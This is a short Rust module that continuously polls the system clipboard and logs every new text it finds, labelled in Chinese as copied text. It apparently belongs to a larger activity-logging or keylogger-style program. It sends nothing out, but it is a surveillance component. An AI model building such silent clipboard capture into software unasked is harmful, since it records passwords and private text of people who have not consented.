use clipboard::ClipboardContext;
use clipboard::ClipboardProvider;
use std::{thread, time};
use crate::logger;

pub fn monitor_clipboard() {
    let mut clipboard: ClipboardContext = ClipboardProvider::new().unwrap();
    let mut last_clipboard = "".into();

    loop {
        let current_clipboard = match clipboard.get_contents() {
            Ok(content) => content,
            Err(_) => {
                thread::sleep(time::Duration::from_millis(1));
                continue;
            }
        };
        
        if current_clipboard != last_clipboard {
            logger::log_event("复制文本", &current_clipboard);
            last_clipboard = current_clipboard;
        }
        thread::sleep(time::Duration::from_millis(1));
    }
}
